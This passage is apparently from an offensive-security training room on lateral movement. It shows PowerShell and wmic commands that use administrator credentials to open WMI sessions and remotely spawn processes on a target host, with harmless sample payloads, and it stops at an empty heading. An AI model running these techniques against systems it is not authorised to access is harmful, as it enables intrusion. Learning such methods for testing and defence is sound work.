We can also perform many techniques discussed in the previous task differently by using Windows Management Instrumentation (WMI). WMI is Windows implementation of Web-Based Enterprise Management (WBEM), an enterprise standard for accessing management information across devices.

In simpler terms, WMI allows administrators to perform standard management tasks that attackers can abuse to perform lateral movement in various ways.

## Connecting to WMI From Powershell
Before being able to connect to WMI using Powershell commands, we need to create a *PSCredential* object with our user and password. This object will be stored in the `$credential` variable.

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

We then proceed to establish a WMI session using either of the following protocols:
- **DCOM:** RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP, just as explained when using sc.exe.
- **Wsman:** WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).

To establish a WMI session from Powershell, we can use the following commands and store the session on the `$Session` variable, which we will use throughout the room on the different techniques:
```powershell
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName {TARGET} -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

The `New-CimSessionOption` cmdlet is used to configure the connection options for the WMI session, including the connection protocol. The options and credentials are then passed to the `New-CimSession` cmdlet to establish a session against a remote host.


## Remote Process Creation Using WMI
- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)  
- **Required Group Memberships:** Administrators

We can remotely spawn a process from Powershell by leveraging Windows Management Instrumentation (WMI), sending a WMI request to the Win32_Process class to spawn the process under the session we created before:
```powershell
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```

Note:
	 WMI won't allow you to see the output of any command but will indeed create the required process silently.

On legacy systems, the same can be done using wmic from the command prompt:
```shell-session
wmic.exe /user:Administrator /password:Mypass123 /node:{TARGET} process call create "cmd.exe /c calc.exe" 
```


## Creating Services Remotely with WMI

